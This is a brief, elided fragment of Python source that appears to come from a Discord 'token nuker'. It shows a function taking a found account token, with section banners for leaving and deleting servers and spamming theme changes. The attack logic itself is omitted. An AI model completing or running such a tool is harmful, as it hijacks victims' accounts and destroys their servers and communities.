...
def Cookies_Nuke(token): # message_Content,
    # <==== Testing ====>

    message_Content = "Hello, World!" # add variable back into func after done testing
    ...
    print("Finished nuking found discord token")
    # <========= Leave & Delete Servers END =========>


# <========= Spam light & dark mode =========>
